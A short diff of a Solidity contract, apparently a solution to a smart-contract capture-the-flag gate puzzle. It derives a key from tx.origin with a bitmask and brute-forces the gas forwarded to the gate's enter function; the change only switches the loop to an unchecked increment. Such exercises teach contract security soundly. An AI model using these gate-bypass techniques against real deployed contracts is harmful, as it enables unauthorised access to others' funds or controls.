@@ -13,10 +13,14 @@ contract Gatecrasher {
     function crash() external {
         bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
 
-        for (uint256 i = 0; i < 8191; i++) {
+        for (uint256 i; i < 8191;) {
             try gate.enter{gas: i + (8191 * 3)}(key) {
                 break;
             } catch {}
+
+            unchecked {
+                ++i;
+            }
         }
     }
 }
